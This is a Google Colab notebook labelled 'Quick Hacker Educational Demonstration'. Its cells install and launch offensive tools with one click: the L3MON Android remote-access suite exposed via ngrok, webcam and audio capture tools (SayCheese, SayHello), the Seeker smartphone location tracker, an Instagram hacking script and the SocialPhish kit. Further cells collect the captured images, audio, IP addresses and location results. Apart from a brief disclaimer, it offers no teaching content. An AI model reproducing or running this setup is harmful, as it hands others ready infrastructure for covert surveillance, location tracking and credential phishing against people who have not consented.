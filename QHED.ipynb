{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "QHED.ipynb",
      "provenance": [],
      "collapsed_sections": [
        "1EP1o4UDLS6f",
        "bOOBrzjbEGo_",
        "yL1BRPGVwfbt",
        "c_zvx6i-64tF",
        "WJ9XTTtVzHfX"
      ],
      "toc_visible": true,
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/limontec/QHED/blob/master/QHED.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Vb0-2MhXtpga",
        "colab_type": "text"
      },
      "source": [
        "#**QHED**\n",
        "\n",
        "**Q**uick **H**acker **E**ducational **D**emonstration\n",
        "\n",
        "Inspiration: https://github.com/biplobsd/OneClickRun\n",
        "\n",
        "Adaptation by https://t.me/limontec\n",
        "\n",
        "DISCLAIMER: TO BE USED FOR EDUCATIONAL PURPOSES ONLY like in the classroom without the need to configure the environment\n",
        "\n",
        "v0.0.7"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "1EP1o4UDLS6f",
        "colab_type": "text"
      },
      "source": [
        "## <img src='https://github.com/D3VL/L3MON/raw/master/server/assets/webpublic/logo.png' height=\"45\" alt=\"L3MON\" /><font size=1px>___L3MON___</font>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "lgzzseqdMSTA",
        "colab_type": "code",
        "cellView": "both",
        "colab": {}
      },
      "source": [
        "#@markdown <br><center><img src='https://github.com/D3VL/L3MON/raw/master/server/assets/webpublic/logo.png' height=\"100\" alt=\"L3MON\"/></center>\n",
        "#@markdown <center><h3>L3MON<br /> Remote Android Managment Suite</h3></center><br>\n",
        "#@markdown <center><h5>Github: https://github.com/D3VL/L3MON</h5></center><br>\n",
        "import os, pathlib, zipfile, re, json, hashlib, time\n",
        "import urllib.request\n",
        "from IPython.display import HTML, clear_output\n",
        "\n",
        "Version = '1.3.0'\n",
        "\n",
        "#####################################\n",
        "USE_FREE_TOKEN = True  # @param {type:\"boolean\"}\n",
        "TOKEN = \"\"  # @param {type:\"string\"}\n",
        "USERNAME = \"\"  # @param {type:\"string\"}\n",
        "PASSWORD = \"\"  # @param {type:\"string\"}\n",
        "RUN_Dir = \"/content/tools/L3MON\"  # @param {type:\"string\"}\n",
        "#@markdown Default <br>&emsp;username : admin<br>&emsp;password : admin\n",
        "HOME = os.path.expanduser(\"~\")\n",
        "\n",
        "if not os.path.exists(f\"{HOME}/.ipython/ocr.py\"):\n",
        "    hCode = \"https://raw.githubusercontent.com/limontec/\" \\\n",
        "                \"QHED/master/res/ocr.py\"\n",
        "    urllib.request.urlretrieve(hCode, f\"{HOME}/.ipython/ocr.py\")\n",
        "\n",
        "\n",
        "from ocr import (\n",
        "    runSh,\n",
        "    loadingAn,\n",
        "    PortForward_wrapper,\n",
        "    findProcess,\n",
        "    displayUrl,\n",
        "    textAn\n",
        ")\n",
        "\n",
        "loadingAn()\n",
        "\n",
        "if not RUN_Dir:\n",
        "  RUN_Dir = \"tools/L3MON\"\n",
        "os.makedirs(RUN_Dir, exist_ok=True)\n",
        "\n",
        "\n",
        "def md5(txt):\n",
        "  return hashlib.md5(txt.encode('utf-8')).hexdigest()\n",
        "\n",
        "# github latest releases tag define\n",
        "def latestTag(link):\n",
        "  import re\n",
        "  from urllib.request import urlopen\n",
        "  htmlF = urlopen(link+\"/releases/latest\").read().decode('UTF-8')\n",
        "  return re.findall(r'.+\\/tag\\/([.0-9A-Za-z]+)\".+/', htmlF)[0]\n",
        "\n",
        "# Downloading latest version of L3MON\n",
        "if not os.path.exists(f\"{RUN_Dir}/index.js\"):\n",
        "  BASE_URL = r\"https://github.com/D3VL/L3MON\"\n",
        "  LATEST_TAG = latestTag(BASE_URL)\n",
        "  urlF = f'{BASE_URL}/releases/download/{LATEST_TAG}/' \\\n",
        "              f'L3MON-v{LATEST_TAG}.zip'\n",
        "  urllib.request.urlretrieve(urlF, f'{RUN_Dir}/newL3MON.zip')\n",
        "  with zipfile.ZipFile(f'{RUN_Dir}/newL3MON.zip', 'r') as zip_ref:\n",
        "      zip_ref.extractall(RUN_Dir)\n",
        "  try:\n",
        "    pathlib.Path(f'{RUN_Dir}/newL3MON.zip').unlink()\n",
        "  except FileNotFoundError:\n",
        "    pass\n",
        "\n",
        "  # Installing L3MON\n",
        "  runSh('npm install pm2 -g')\n",
        "\n",
        "  # Uninstalling latest java\n",
        "  runSh('apt purge openjdk-\\* icedtea-\\* icedtea6-\\*')\n",
        "  runSh('apt update')\n",
        "  # Install version 8\n",
        "  runSh('apt install openjdk-8-jre')\n",
        "  runSh('npm install', cd=RUN_Dir)\n",
        "  runSh('pm2 start index.js', cd=RUN_Dir)\n",
        "  time.sleep(2)\n",
        "  runSh('pm2 stop index.js', cd=RUN_Dir)\n",
        "  with open(f'{RUN_Dir}/maindb.json', 'r+') as f:\n",
        "      data = json.load(f)\n",
        "      if USERNAME:\n",
        "        data['admin']['username'] = USERNAME\n",
        "      if PASSWORD:\n",
        "        data['admin']['password'] = md5(PASSWORD)\n",
        "      else:\n",
        "        data['admin']['password'] = md5('admin')\n",
        "      f.seek(0)        \n",
        "      json.dump(data, f, indent=4)\n",
        "      f.truncate()\n",
        "\n",
        "if not findProcess('node' f'{RUN_Dir}/index.js'):\n",
        "  runSh('pm2 restart all', shell=True, cd=RUN_Dir)\n",
        "\n",
        "# START_SERVER\n",
        "# Ngrok region 'us','eu','ap','au','sa','jp','in'\n",
        "clear_output()\n",
        "PORT_FORWARD = \"ngrok\" #@param [\"ngrok\", \"localhost\"]\n",
        "Server = PortForward_wrapper(\n",
        "    PORT_FORWARD, TOKEN, USE_FREE_TOKEN, [['L3MON', 22533, 'http'], \n",
        "                            ['L3MON_Client', 22222, 'http']], 'ap', \n",
        "    [f\"{HOME}/.ngrok2/L3MON.yml\", 4051]\n",
        ")\n",
        "data = Server.start('L3MON')\n",
        "data2 = Server.start('L3MON_Client', displayB=False, v=False)\n",
        "Host, port = data2['url'][7:], '80'\n",
        "\n",
        "display(HTML(\"\"\"<style>@import url('https://fonts.googleapis.com/css?family=Source+Code+Pro:200,900');  :root {   --text-color: hsla(210, 50%, 85%, 1);   --shadow-color: hsla(210, 40%, 52%, .4);   --btn-color: hsl(210, 80%, 42%);   --bg-color: #141218; }  * {   box-sizing: border-box; } button { position:relative; padding: 10px 20px;     border: none;   background: none;      font-family: \"Source Code Pro\";   font-weight: 900;font-size: 20px;     color: var(--text-color);      background-color: var(--btn-color);   box-shadow: var(--shadow-color) 2px 2px 22px;   border-radius: 4px;    z-index: 0;overflow: hidden; -webkit-user-select: text;-moz-user-select: text;-ms-user-select: text;user-select: text;}  button:focus {   outline-color: transparent;   box-shadow: var(--btn-color) 2px 2px 22px; }  .right::after, button::after {   content: var(--content);   display: block;   position: absolute;   white-space: nowrap;   padding: 40px 40px;   pointer-events:none; }  button::after{   font-weight: 200;   top: -30px;   left: -20px; }   .right, .left {   position: absolute;   width: 100%;   height: 100%;   top: 0; } .right {   left: 66%; } .left {   right: 66%; } .right::after {   top: -30px;   left: calc(-66% - 20px);      background-color: var(--bg-color);   color:transparent;   transition: transform .4s ease-out;   transform: translate(0, -90%) rotate(0deg) }  button:hover .right::after {   transform: translate(0, -47%) rotate(0deg) }  button .right:hover::after {   transform: translate(0, -50%) rotate(-7deg) }  button .left:hover ~ .right::after {   transform: translate(0, -50%) rotate(7deg) }  /* bubbles */ button::before {   content: '';   pointer-events: none;   opacity: .6;   background:     radial-gradient(circle at 20% 35%,  transparent 0,  transparent 2px, var(--text-color) 3px, var(--text-color) 4px, transparent 4px),     radial-gradient(circle at 75% 44%, transparent 0,  transparent 2px, var(--text-color) 3px, var(--text-color) 4px, transparent 4px),     radial-gradient(circle at 46% 52%, transparent 0, transparent 4px, var(--text-color) 5px, var(--text-color) 6px, transparent 6px);    width: 100%;   height: 300%;   top: 0;   left: 0;   position: absolute;   animation: bubbles 5s linear infinite both; }  @keyframes bubbles {   from {     transform: translate();   }   to {     transform: translate(0, -66.666%);   } }.zui-table {    border: solid 1px #DDEEEE;    border-collapse: collapse;    border-spacing: 0;    font: normal 13px;}.zui-table thead th {    background-color: #DDEFEF;    border: solid 1px #DDEEEE;    color: #0000009e;    padding: 10px;    text-align: left;}.zui-table tbody td {border: solid 1px #effff97a;color: #ffffffd1;    padding: 10px;}</style><center><button><table class=\"zui-table blueBG\"><p>Listening address<p><thead>        <tr>        <th>Host</th>            <th>Port</th> </tr>    </thead>    <tbody>        <tr><td>\"\"\"+Host+\"\"\"</td><td>\"\"\"+port+\"\"\"</td></tr></tbody></table><a target=\"_blank\" style=\"text-decoration: none;color: hsla(210, 50%, 85%, 1);font-size: 10px;\" href=\"https://raw.githubusercontent.com/biplobsd/OneClickRun/master/img/L3MON_DEMO.gif\">NB. How to setup this's config. [Click ME]</a></button><center>\"\"\"))\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "bOOBrzjbEGo_",
        "colab_type": "text"
      },
      "source": [
        "## ___SayCheese v1.2___"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "U8-zrqX8EEah",
        "colab_type": "code",
        "cellView": "both",
        "colab": {}
      },
      "source": [
        "#@markdown <center><h2><h1>SayCheese v1.2</h1>Remote Android Managment Suite</h2></center><br>\n",
        "#@markdown <center>Github: https://github.com/thelinuxchoice/saycheese</center><br>\n",
        "import os, urllib.request\n",
        "from IPython.display import clear_output\n",
        "\n",
        "Version = '1.2.0'\n",
        "HOME = os.path.expanduser(\"~\")\n",
        "\n",
        "if not os.path.exists(f\"{HOME}/.ipython/ocr.py\"):\n",
        "    hCode = \"https://raw.githubusercontent.com/limontec/\" \\\n",
        "                \"QHED/master/res/ocr.py\"\n",
        "    urllib.request.urlretrieve(hCode, f\"{HOME}/.ipython/ocr.py\")\n",
        "\n",
        "from ocr import (\n",
        "    runSh,\n",
        "    loadingAn\n",
        ")\n",
        "\n",
        "loadingAn()\n",
        "\n",
        "RUN_Dir = \"tools/\"\n",
        "os.makedirs(RUN_Dir, exist_ok=True)\n",
        "\n",
        "# Downloading saycheese\n",
        "if not os.path.exists(f'{RUN_Dir}/saycheese/saycheese.sh'):\n",
        "  runSh('apt update')\n",
        "  runSh('apt install -y php')\n",
        "  runSh('apt install httrack')\n",
        "  runSh('git clone https://github.com/thelinuxchoice/saycheese.git',\n",
        "        cd=RUN_Dir)\n",
        "clear_output()\n",
        "print('')\n",
        "!cd tools/saycheese && bash saycheese.sh"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6EGHwznNv05g",
        "colab_type": "code",
        "cellView": "both",
        "colab": {}
      },
      "source": [
        "# @markdown #### Download output File\n",
        "makeArchive = False #@param {type:\"boolean\"}\n",
        "makeVideo = True #@param {type:\"boolean\"}\n",
        "from google.colab import files\n",
        "\n",
        "def downloadFile():\n",
        "  try:\n",
        "    if makeVideo:\n",
        "      !cd tools/saycheese/images && ffmpeg -y -r 1 -pattern_type glob -i 'cam*.png' -c:v libx264 out.mp4\n",
        "      files.download('tools/saycheese/images/out.mp4')\n",
        "    if makeArchive:\n",
        "      !cd tools/saycheese/images && zip -9 -r save.zip cam*.png out.mp4 saved.ip.txt\n",
        "      files.download('tools/saycheese/images/save.zip')\n",
        "  except FileNotFoundError:\n",
        "    print(\"File not found!\")\n",
        "  except:\n",
        "    print(\"Something else went wrong, try download manually\")\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "  downloadFile()\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LXAY0A2kD0jf",
        "colab_type": "text"
      },
      "source": [
        "## ___SAyHello v1.0___"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-sXRlCQhEEbK",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "#@markdown <center><h2><h1>SAyHello v1.0</h1>-</h2></center><br>\n",
        "#@markdown <center>Github: https://github.com/thelinuxchoice/sayhello</center><br>\n",
        "import os, urllib.request\n",
        "from IPython.display import clear_output\n",
        "\n",
        "Version = '1.0.0'\n",
        "HOME = os.path.expanduser(\"~\")\n",
        "\n",
        "if not os.path.exists(f\"{HOME}/.ipython/ocr.py\"):\n",
        "    hCode = \"https://raw.githubusercontent.com/limontec/\" \\\n",
        "                \"QHED/master/res/ocr.py\"\n",
        "    urllib.request.urlretrieve(hCode, f\"{HOME}/.ipython/ocr.py\")\n",
        "\n",
        "from ocr import (\n",
        "    runSh,\n",
        "    loadingAn\n",
        ")\n",
        "\n",
        "loadingAn()\n",
        "\n",
        "RUN_Dir = \"tools/\"\n",
        "os.makedirs(RUN_Dir, exist_ok=True)\n",
        "\n",
        "# Downloading sayhello\n",
        "if not os.path.exists(f'{RUN_Dir}/sayhello/sayhello.sh'):\n",
        "  runSh('apt update')\n",
        "  runSh('apt install -y php')\n",
        "  #runSh('apt install httrack')\n",
        "  runSh('git clone https://github.com/thelinuxchoice/sayhello.git',\n",
        "        cd=RUN_Dir)\n",
        "clear_output()\n",
        "print('')\n",
        "!cd tools/sayhello && bash sayhello.sh"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "THTEv7s6FsTL",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# @markdown #### Download output File\n",
        "from google.colab import files\n",
        "\n",
        "def downloadFile():\n",
        "  try:\n",
        "    !cd tools/sayhello && zip -9 -r save_audio.zip *.wav saved.ip.txt\n",
        "    files.download('tools/sayhello/save_audio.zip')\n",
        "  except FileNotFoundError:\n",
        "    print(\"File not found!\")\n",
        "  except:\n",
        "    print(\"Something else went wrong, try download manually\")\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "  downloadFile()\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "yL1BRPGVwfbt",
        "colab_type": "text"
      },
      "source": [
        "## Seeker"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "qPQcUGetoHU9",
        "colab_type": "code",
        "cellView": "both",
        "colab": {}
      },
      "source": [
        "#@markdown <center><h3><h2>Seeker</h2>ACCURATELY LOCATE SMARTPHONES USING SOCIAL ENGINEERING</h3></center><br>\n",
        "#@markdown <center>Github: https://github.com/thewhiteh4t/seeker</center><br>\n",
        "import os, urllib.request\n",
        "from IPython.display import clear_output\n",
        "\n",
        "#####################################\n",
        "USE_FREE_TOKEN = True  # @param {type:\"boolean\"}\n",
        "TOKEN = \"\"  # @param {type:\"string\"}\n",
        "Version = '1.2.4'\n",
        "HOME = os.path.expanduser(\"~\")\n",
        "\n",
        "if not os.path.exists(f\"{HOME}/.ipython/ocr.py\"):\n",
        "    hCode = \"https://raw.githubusercontent.com/limontec/\" \\\n",
        "                \"QHED/master/res/ocr.py\"\n",
        "    urllib.request.urlretrieve(hCode, f\"{HOME}/.ipython/ocr.py\")\n",
        "\n",
        "from ocr import (\n",
        "    runSh,\n",
        "    loadingAn,\n",
        "    PortForward_wrapper,\n",
        "    findProcess,\n",
        "    displayUrl,\n",
        "    textAn\n",
        ")\n",
        "\n",
        "loadingAn()\n",
        "\n",
        "RUN_Dir = \"tools/\"\n",
        "os.makedirs(RUN_Dir, exist_ok=True)\n",
        "\n",
        "# Downloading seeker\n",
        "if not os.path.exists(f'{RUN_Dir}/seeker/seeker.py'):\n",
        "  runSh('apt update')\n",
        "  runSh('git clone https://github.com/thewhiteh4t/seeker.git',\n",
        "        cd=RUN_Dir)\n",
        "  !cd tools/seeker && chmod +x install.sh\n",
        "  !cd tools/seeker && bash install.sh\n",
        "clear_output()\n",
        "print('')\n",
        "# START_SERVER\n",
        "# Ngrok region 'us','eu','ap','au','sa','jp','in'\n",
        "PORT_FORWARD = \"localhost\" #@param [\"ngrok\", \"localhost\"]\n",
        "Server = PortForward_wrapper(\n",
        "    PORT_FORWARD, TOKEN, USE_FREE_TOKEN, [['seeker', 80, 'http']], 'us', [f\"{HOME}/.ngrok2/seeker.yml\", 4040]\n",
        "    ).start('seeker', displayB=False)\n",
        "\n",
        "displayUrl(Server, pNamU='Seeker : ')\n",
        "!cd tools/seeker && ./seeker.py -t manual -k testkml -p 80"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "cellView": "both",
        "id": "HhEm9D48dKDf",
        "colab": {}
      },
      "source": [
        "# @markdown #### Download output File\n",
        "#@markdown To download manually:<br>tools/seeker/testkml.kml<br>tools/seeker/db/results.csv\n",
        "from google.colab import files\n",
        "\n",
        "def downloadFile():\n",
        "  try:\n",
        "      files.download('tools/seeker/testkml.kml')\n",
        "      files.download('tools/seeker/db/results.csv')\n",
        "  except FileNotFoundError:\n",
        "    print(\"File not found!\")\n",
        "  except:\n",
        "    print(\"Something else went wrong, try download manually\")\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "  downloadFile()\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kAyJJubRgB20",
        "colab_type": "text"
      },
      "source": [
        "## Inshackle"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "MH_U_FHugDPb",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "#@markdown <center><h2>Inshackle v1.0</h2></center>\n",
        "#@markdown <h4><center>Instagram hacks: Track unfollowers, Increase your followers, Download Stories, etc</center></h4>\n",
        "#@markdown <center>Github: https://github.com/thelinuxchoice/inshackle</center><br>\n",
        "import os, urllib.request\n",
        "from IPython.display import clear_output\n",
        "\n",
        "Version = '1.0.0'\n",
        "HOME = os.path.expanduser(\"~\")\n",
        "\n",
        "if not os.path.exists(f\"{HOME}/.ipython/ocr.py\"):\n",
        "    hCode = \"https://raw.githubusercontent.com/limontec/\" \\\n",
        "                \"QHED/master/res/ocr.py\"\n",
        "    urllib.request.urlretrieve(hCode, f\"{HOME}/.ipython/ocr.py\")\n",
        "\n",
        "from ocr import (\n",
        "    runSh,\n",
        "    loadingAn\n",
        ")\n",
        "\n",
        "loadingAn()\n",
        "\n",
        "RUN_Dir = \"tools/\"\n",
        "os.makedirs(RUN_Dir, exist_ok=True)\n",
        "\n",
        "# Downloading inshackle\n",
        "if not os.path.exists(f'{RUN_Dir}/inshackle/inshackle.sh'):\n",
        "  runSh('apt update')\n",
        "  runSh('apt install -y php')\n",
        "  runSh('git clone https://github.com/thelinuxchoice/inshackle',\n",
        "        cd=RUN_Dir)\n",
        "  !cd tools/inshackle && chmod +x inshackle.sh\n",
        "clear_output()\n",
        "print('')\n",
        "!cd tools/inshackle && bash inshackle.sh\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "c_zvx6i-64tF",
        "colab_type": "text"
      },
      "source": [
        "## SocialPhish v1.6"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "19VmORXV7c2U",
        "colab_type": "code",
        "cellView": "both",
        "colab": {}
      },
      "source": [
        "#@markdown <center><h3><h2>SocialPhish v1.6</h2>The most complete Phishing Tool, with 32 templates +1 customizable</h3></center><br>\n",
        "#@markdown <center>Github: https://github.com/xHak9x/SocialPhish</center><br>\n",
        "import os, urllib.request\n",
        "from IPython.display import clear_output\n",
        "\n",
        "Version = '1.6.0'\n",
        "HOME = os.path.expanduser(\"~\")\n",
        "\n",
        "if not os.path.exists(f\"{HOME}/.ipython/ocr.py\"):\n",
        "    hCode = \"https://raw.githubusercontent.com/limontec/\" \\\n",
        "                \"QHED/master/res/ocr.py\"\n",
        "    urllib.request.urlretrieve(hCode, f\"{HOME}/.ipython/ocr.py\")\n",
        "\n",
        "from ocr import (\n",
        "    runSh,\n",
        "    loadingAn\n",
        ")\n",
        "\n",
        "loadingAn()\n",
        "\n",
        "RUN_Dir = \"tools/\"\n",
        "os.makedirs(RUN_Dir, exist_ok=True)\n",
        "\n",
        "# Downloading SocialPhish\n",
        "if not os.path.exists(f'{RUN_Dir}/SocialPhish/socialphish.sh'):\n",
        "  runSh('apt update')\n",
        "  runSh('apt install -y php')\n",
        "  runSh('git clone https://github.com/xHak9x/SocialPhish.git',\n",
        "        cd=RUN_Dir)\n",
        "  !cd tools/SocialPhish && chmod +x socialphish.sh\n",
        "clear_output()\n",
        "print('')\n",
        "!cd tools/SocialPhish/ && ./socialphish.sh\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "WJ9XTTtVzHfX",
        "colab_type": "text"
      },
      "source": [
        "##GDrive access your drive content"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "tPuLCnbGFmxo",
        "colab_type": "code",
        "cellView": "both",
        "colab": {}
      },
      "source": [
        "#@markdown <br><center><img src='https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Google_Drive_logo.png/600px-Google_Drive_logo.png' height=\"50\" alt=\"Gdrive-logo\"/></center>\n",
        "#@markdown <center><h3>Mount Gdrive to /content/drive</h3></center><br>\n",
        "MODE = \"MOUNT\" #@param [\"MOUNT\", \"UNMOUNT\"]\n",
        "#Mount your Gdrive! \n",
        "from google.colab import drive\n",
        "drive.mount._DEBUG = False\n",
        "if MODE == \"MOUNT\":\n",
        "  drive.mount('/content/drive', force_remount=True)\n",
        "elif MODE == \"UNMOUNT\":\n",
        "  try:\n",
        "    drive.flush_and_unmount()\n",
        "  except ValueError:\n",
        "    pass\n",
        "  get_ipython().system_raw(\"rm -rf /root/.config/Google/DriveFS\")"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}